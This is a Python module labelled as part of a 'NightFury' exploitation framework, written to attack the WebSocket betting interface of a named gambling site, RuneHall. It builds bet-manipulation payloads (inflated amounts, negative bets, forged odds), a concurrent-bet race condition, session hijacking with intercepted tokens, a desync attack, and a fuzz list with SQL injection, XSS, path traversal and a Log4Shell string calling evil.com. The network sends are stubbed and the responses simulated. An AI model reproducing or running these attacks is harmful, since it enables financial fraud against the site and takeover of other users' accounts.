"""
NightFury Framework - RuneHall WebSocket Exploitation
Real-time message injection, hijacking, binary protocol fuzzing, race conditions
"""

import json
import asyncio
import time
import hashlib
import base64
from typing import List, Dict, Optional, Callable, Any
from datetime import datetime
from enum import Enum
import logging

logger = logging.getLogger(__name__)

class MessageType(Enum):
    """WebSocket message types."""
    TEXT = "text"
    BINARY = "binary"
    PING = "ping"
    PONG = "pong"
    CLOSE = "close"

class ExploitTechnique(Enum):
    """WebSocket exploitation techniques."""
    MESSAGE_INJECTION = "message_injection"
    HIJACKING = "hijacking"
    RACE_CONDITION = "race_condition"
    PROTOCOL_CONFUSION = "protocol_confusion"
    DESYNC = "desync"
    SMUGGLING = "smuggling"

class RuneHallWebSocketExploit:
    """
    Advanced WebSocket exploitation for RuneHall real-time betting system.
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.connection = None
        self.message_history = []
        self.intercepted_messages = []
        self.session_tokens = []
        self.protocol_version = None
        
        # Exploitation state
        self.bet_manipulation_active = False
        self.race_condition_window = 0.05  # 50ms window
        
    async def connect(self, headers: Optional[Dict] = None) -> bool:
        """
        Establish WebSocket connection.
        
        Args:
            headers: Optional custom headers
            
        Returns:
            Connection success status
        """
        try:
            # Simulate WebSocket connection
            logger.info(f"[WS-EXPLOIT] Connecting to {self.target_url}")
            
            # In production, use websockets library
            # self.connection = await websockets.connect(self.target_url, extra_headers=headers)
            
            # Simulate connection
            await asyncio.sleep(0.1)
            self.connection = {'status': 'connected', 'url': self.target_url}
            
            logger.info("[WS-EXPLOIT] Connection established")
            return True
            
        except Exception as e:
            logger.error(f"[WS-EXPLOIT] Connection failed: {e}")
            return False
    
    async def intercept_messages(self, duration: float = 60.0) -> List[Dict]:
        """
        Intercept and analyze WebSocket messages.
        
        Args:
            duration: Duration to intercept in seconds
            
        Returns:
            List of intercepted messages
        """
        logger.info(f"[WS-EXPLOIT] Intercepting messages for {duration}s")
        
        start_time = time.time()
        intercepted = []
        
        while time.time() - start_time < duration:
            # Simulate receiving messages
            message = await self._receive_message()
            
            if message:
                intercepted.append({
                    'timestamp': time.time(),
                    'type': message['type'],
                    'data': message['data'],
                    'size': len(str(message['data'])),
                    'analysis': self._analyze_message(message)
                })
                
                self.message_history.append(message)
            
            await asyncio.sleep(0.1)
        
        self.intercepted_messages = intercepted
        logger.info(f"[WS-EXPLOIT] Intercepted {len(intercepted)} messages")
        
        return intercepted
    
    async def _receive_message(self) -> Optional[Dict]:
        """Simulate receiving WebSocket message."""
        # In production, use: message = await self.connection.recv()
        
        # Simulate different message types from RuneHall
        message_templates = [
            {
                'type': 'bet_placed',
                'data': {
                    'bet_id': f'bet_{int(time.time())}',
                    'user_id': 'user_12345',
                    'amount': 100,
                    'game': 'roulette',
                    'selection': 'red'
                }
            },
            {
                'type': 'game_result',
                'data': {
                    'game_id': f'game_{int(time.time())}',
                    'result': 'red',
                    'winning_bets': ['bet_123', 'bet_456']
                }
            },
            {
                'type': 'balance_update',
                'data': {
                    'user_id': 'user_12345',
                    'new_balance': 1500,
                    'currency': 'GP'
                }
            },
            {
                'type': 'heartbeat',
                'data': {
                    'timestamp': int(time.time()),
                    'server_time': int(time.time())
                }
            }
        ]
        
        # Randomly return a message or None
        if asyncio.get_event_loop().time() % 1 < 0.3:  # 30% chance
            return {
                'type': MessageType.TEXT.value,
                'data': message_templates[int(time.time()) % len(message_templates)]
            }
        
        return None
    
    def _analyze_message(self, message: Dict) -> Dict:
        """Analyze message for exploitation opportunities."""
        analysis = {
            'exploitable': False,
            'vulnerabilities': [],
            'techniques': []
        }
        
        data = message.get('data', {})
        
        # Check for bet manipulation opportunities
        if 'bet_id' in data or 'amount' in data:
            analysis['exploitable'] = True
            analysis['vulnerabilities'].append('bet_manipulation')
            analysis['techniques'].append(ExploitTechnique.MESSAGE_INJECTION.value)
        
        # Check for race condition opportunities
        if 'game_result' in str(data) or 'balance_update' in str(data):
            analysis['exploitable'] = True
            analysis['vulnerabilities'].append('race_condition')
            analysis['techniques'].append(ExploitTechnique.RACE_CONDITION.value)
        
        # Check for session token exposure
        if 'token' in str(data).lower() or 'session' in str(data).lower():
            analysis['exploitable'] = True
            analysis['vulnerabilities'].append('session_exposure')
            analysis['techniques'].append(ExploitTechnique.HIJACKING.value)
        
        # Check for IDOR
        if 'user_id' in data:
            analysis['exploitable'] = True
            analysis['vulnerabilities'].append('idor')
            analysis['techniques'].append(ExploitTechnique.MESSAGE_INJECTION.value)
        
        return analysis
    
    async def inject_malicious_message(self, message_type: str, 
                                       payload: Dict) -> Dict:
        """
        Inject malicious message into WebSocket stream.
        
        Args:
            message_type: Type of message to inject
            payload: Malicious payload
            
        Returns:
            Injection result
        """
        logger.info(f"[WS-EXPLOIT] Injecting {message_type} message")
        
        malicious_message = {
            'type': message_type,
            'data': payload,
            'timestamp': time.time()
        }
        
        try:
            # In production: await self.connection.send(json.dumps(malicious_message))
            await asyncio.sleep(0.05)  # Simulate send
            
            # Wait for response
            response = await self._wait_for_response(timeout=2.0)
            
            result = {
                'success': response is not None,
                'message_sent': malicious_message,
                'response': response,
                'exploitation_successful': self._check_exploitation_success(response)
            }
            
            logger.info(f"[WS-EXPLOIT] Injection result: {result['success']}")
            return result
            
        except Exception as e:
            logger.error(f"[WS-EXPLOIT] Injection failed: {e}")
            return {'success': False, 'error': str(e)}
    
    async def _wait_for_response(self, timeout: float = 2.0) -> Optional[Dict]:
        """Wait for WebSocket response."""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            message = await self._receive_message()
            if message:
                return message
            await asyncio.sleep(0.05)
        
        return None
    
    def _check_exploitation_success(self, response: Optional[Dict]) -> bool:
        """Check if exploitation was successful."""
        if not response:
            return False
        
        data = response.get('data', {})
        
        # Check for success indicators
        success_indicators = [
            'success', 'approved', 'confirmed', 'balance_update', 'bet_accepted'
        ]
        
        response_str = str(data).lower()
        return any(indicator in response_str for indicator in success_indicators)
    
    async def exploit_bet_manipulation(self, target_bet_id: str,
                                      manipulation_type: str = 'amount') -> Dict:
        """
        Exploit bet manipulation vulnerability.
        
        Args:
            target_bet_id: Target bet ID
            manipulation_type: Type of manipulation (amount, selection, odds)
            
        Returns:
            Exploitation result
        """
        logger.info(f"[WS-EXPLOIT] Exploiting bet manipulation: {manipulation_type}")
        
        payloads = {
            'amount': {
                'type': 'bet_update',
                'data': {
                    'bet_id': target_bet_id,
                    'new_amount': 999999,  # Manipulated amount
                    'bypass': True
                }
            },
            'selection': {
                'type': 'bet_update',
                'data': {
                    'bet_id': target_bet_id,
                    'selections': ['red', 'black'],  # Bet on both
                    'bypass': True
                }
            },
            'odds': {
                'type': 'bet_update',
                'data': {
                    'bet_id': target_bet_id,
                    'custom_odds': 100.0,  # Manipulated odds
                    'bypass': True
                }
            },
            'negative_amount': {
                'type': 'bet_place',
                'data': {
                    'amount': -1000,  # Negative bet to gain money
                    'game': 'roulette',
                    'selection': 'red'
                }
            }
        }
        
        payload = payloads.get(manipulation_type, payloads['amount'])
        result = await self.inject_malicious_message(payload['type'], payload['data'])
        
        return {
            'manipulation_type': manipulation_type,
            'target_bet_id': target_bet_id,
            'result': result
        }
    
    async def exploit_race_condition(self, bet_amount: int = 100,
                                    concurrent_bets: int = 50) -> Dict:
        """
        Exploit race condition in bet processing.
        
        Args:
            bet_amount: Amount to bet
            concurrent_bets: Number of concurrent bets
            
        Returns:
            Exploitation result
        """
        logger.info(f"[WS-EXPLOIT] Exploiting race condition with {concurrent_bets} concurrent bets")
        
        # Create bet payload
        bet_payload = {
            'type': 'bet_place',
            'data': {
                'amount': bet_amount,
                'game': 'roulette',
                'selection': 'red',
                'user_id': 'user_12345'
            }
        }
        
        # Send concurrent bets
        tasks = []
        for i in range(concurrent_bets):
            task = self.inject_malicious_message(bet_payload['type'], bet_payload['data'])
            tasks.append(task)
        
        # Execute all bets simultaneously
        results = await asyncio.gather(*tasks)
        
        # Analyze results
        successful_bets = sum(1 for r in results if r.get('success'))
        exploited = successful_bets > 1  # If more than one bet succeeded with same balance
        
        return {
            'concurrent_bets': concurrent_bets,
            'successful_bets': successful_bets,
            'exploited': exploited,
            'potential_gain': bet_amount * successful_bets if exploited else 0
        }
    
    async def exploit_session_hijacking(self) -> Dict:
        """
        Attempt to hijack another user's WebSocket session.
        
        Returns:
            Hijacking result
        """
        logger.info("[WS-EXPLOIT] Attempting session hijacking")
        
        # Extract session tokens from intercepted messages
        tokens = self._extract_session_tokens()
        
        if not tokens:
            return {'success': False, 'reason': 'No session tokens found'}
        
        # Try to use extracted tokens
        hijack_results = []
        
        for token in tokens[:5]:  # Try top 5 tokens
            # Attempt to authenticate with stolen token
            auth_payload = {
                'type': 'authenticate',
                'data': {
                    'session_token': token,
                    'user_id': 'hijacked_user'
                }
            }
            
            result = await self.inject_malicious_message(
                auth_payload['type'], 
                auth_payload['data']
            )
            
            hijack_results.append({
                'token': token[:20] + '...',
                'success': result.get('exploitation_successful', False)
            })
        
        successful_hijacks = [r for r in hijack_results if r['success']]
        
        return {
            'tokens_found': len(tokens),
            'hijack_attempts': len(hijack_results),
            'successful_hijacks': len(successful_hijacks),
            'results': hijack_results
        }
    
    def _extract_session_tokens(self) -> List[str]:
        """Extract session tokens from intercepted messages."""
        tokens = []
        
        for message in self.message_history:
            data = message.get('data', {})
            data_str = str(data)
            
            # Look for token patterns
            if 'token' in data_str.lower():
                # Extract token-like strings
                if isinstance(data, dict):
                    for key, value in data.items():
                        if 'token' in key.lower() and isinstance(value, str):
                            tokens.append(value)
        
        return list(set(tokens))  # Remove duplicates
    
    async def fuzz_protocol(self, num_payloads: int = 100) -> Dict:
        """
        Fuzz WebSocket protocol to discover vulnerabilities.
        
        Args:
            num_payloads: Number of fuzzing payloads
            
        Returns:
            Fuzzing results
        """
        logger.info(f"[WS-EXPLOIT] Fuzzing protocol with {num_payloads} payloads")
        
        fuzz_results = {
            'total_payloads': num_payloads,
            'crashes': [],
            'errors': [],
            'anomalies': [],
            'potential_vulns': []
        }
        
        for i in range(num_payloads):
            payload = self._generate_fuzz_payload(i)
            
            try:
                result = await self.inject_malicious_message('fuzz', payload)
                
                # Analyze response for anomalies
                if result.get('response'):
                    response = result['response']
                    
                    # Check for error messages
                    if 'error' in str(response).lower():
                        fuzz_results['errors'].append({
                            'payload': payload,
                            'response': response
                        })
                    
                    # Check for unexpected success
                    if result.get('exploitation_successful'):
                        fuzz_results['potential_vulns'].append({
                            'payload': payload,
                            'response': response
                        })
                
            except Exception as e:
                fuzz_results['crashes'].append({
                    'payload': payload,
                    'error': str(e)
                })
            
            await asyncio.sleep(0.05)  # Rate limiting
        
        logger.info(f"[WS-EXPLOIT] Fuzzing complete. Found {len(fuzz_results['potential_vulns'])} potential vulnerabilities")
        
        return fuzz_results
    
    def _generate_fuzz_payload(self, seed: int) -> Dict:
        """Generate fuzzing payload."""
        import random
        random.seed(seed)
        
        fuzz_types = [
            # Integer overflow
            {'amount': 2**31 - 1},
            {'amount': -2**31},
            
            # String injection
            {'user_id': "' OR '1'='1"},
            {'game': "<script>alert(1)</script>"},
            
            # Type confusion
            {'amount': "not_a_number"},
            {'bet_id': 12345},  # Should be string
            
            # Null bytes
            {'selection': 'red\x00admin'},
            
            # Array injection
            {'selections': ['red', 'black', 'green'] * 100},
            
            # Nested objects
            {'data': {'nested': {'deep': {'very': {'deep': 'value'}}}}},
            
            # Special characters
            {'game': '../../etc/passwd'},
            {'user_id': '${jndi:ldap://evil.com/a}'},
        ]
        
        return random.choice(fuzz_types)
    
    async def exploit_desync_attack(self) -> Dict:
        """
        Attempt WebSocket desync attack.
        
        Returns:
            Desync attack result
        """
        logger.info("[WS-EXPLOIT] Attempting desync attack")
        
        # Send conflicting messages to cause desync
        messages = [
            {
                'type': 'bet_place',
                'data': {'bet_id': 'bet_001', 'amount': 100}
            },
            {
                'type': 'bet_cancel',
                'data': {'bet_id': 'bet_001'}
            },
            {
                'type': 'bet_place',
                'data': {'bet_id': 'bet_001', 'amount': 1000}  # Same ID, different amount
            }
        ]
        
        # Send messages in rapid succession
        results = []
        for msg in messages:
            result = await self.inject_malicious_message(msg['type'], msg['data'])
            results.append(result)
            await asyncio.sleep(0.01)  # Minimal delay
        
        # Check if desync occurred
        desync_detected = self._detect_desync(results)
        
        return {
            'attack_type': 'desync',
            'messages_sent': len(messages),
            'desync_detected': desync_detected,
            'results': results
        }
    
    def _detect_desync(self, results: List[Dict]) -> bool:
        """Detect if desync occurred."""
        # Check for conflicting responses
        success_count = sum(1 for r in results if r.get('success'))
        
        # If all messages succeeded despite conflicts, desync likely occurred
        return success_count == len(results)
    
    def generate_report(self) -> Dict:
        """Generate comprehensive exploitation report."""
        return {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'connection_status': 'connected' if self.connection else 'disconnected',
            'messages_intercepted': len(self.message_history),
            'session_tokens_found': len(self._extract_session_tokens()),
            'exploitable_messages': sum(
                1 for msg in self.intercepted_messages 
                if msg.get('analysis', {}).get('exploitable', False)
            ),
            'exploitation_techniques': self._summarize_techniques(),
            'recommendations': self._generate_recommendations()
        }
    
    def _summarize_techniques(self) -> Dict:
        """Summarize available exploitation techniques."""
        techniques = {}
        
        for msg in self.intercepted_messages:
            analysis = msg.get('analysis', {})
            for technique in analysis.get('techniques', []):
                techniques[technique] = techniques.get(technique, 0) + 1
        
        return techniques
    
    def _generate_recommendations(self) -> List[str]:
        """Generate exploitation recommendations."""
        recommendations = [
            "Implement message signing to prevent injection attacks",
            "Use secure WebSocket (wss://) with proper TLS configuration",
            "Implement rate limiting on bet placement",
            "Add server-side validation for all bet parameters",
            "Use unpredictable session tokens with short expiration",
            "Implement proper synchronization for race condition prevention",
            "Add message sequence numbers to detect desync attacks",
            "Implement comprehensive input validation on all WebSocket messages"
        ]
        
        return recommendations

# Testing and demonstration
async def main():
    exploit = RuneHallWebSocketExploit("wss://play.runehall.com/ws")
    
    print("=" * 60)
    print("NightFury RuneHall WebSocket Exploit - Demonstration")
    print("=" * 60)
    
    # Connect
    print("\n[*] Establishing WebSocket connection...")
    await exploit.connect()
    
    # Intercept messages
    print("\n[*] Intercepting messages...")
    messages = await exploit.intercept_messages(duration=2.0)
    print(f"    Intercepted: {len(messages)} messages")
    
    exploitable = sum(1 for m in messages if m['analysis']['exploitable'])
    print(f"    Exploitable: {exploitable} messages")
    
    # Test bet manipulation
    print("\n[*] Testing bet manipulation...")
    bet_result = await exploit.exploit_bet_manipulation('bet_12345', 'amount')
    print(f"    Success: {bet_result['result'].get('success', False)}")
    
    # Test race condition
    print("\n[*] Testing race condition...")
    race_result = await exploit.exploit_race_condition(bet_amount=100, concurrent_bets=10)
    print(f"    Exploited: {race_result['exploited']}")
    print(f"    Successful bets: {race_result['successful_bets']}")
    
    # Test session hijacking
    print("\n[*] Testing session hijacking...")
    hijack_result = await exploit.exploit_session_hijacking()
    print(f"    Tokens found: {hijack_result['tokens_found']}")
    print(f"    Successful hijacks: {hijack_result['successful_hijacks']}")
    
    # Generate report
    report = exploit.generate_report()
    print(f"\n[*] Report Summary:")
    print(f"    Messages intercepted: {report['messages_intercepted']}")
    print(f"    Exploitable messages: {report['exploitable_messages']}")
    print(f"    Session tokens found: {report['session_tokens_found']}")
    
    print("\n" + "=" * 60)
    print("[âœ“] RuneHall WebSocket Exploit operational")
    print("=" * 60)

if __name__ == "__main__":
    asyncio.run(main())
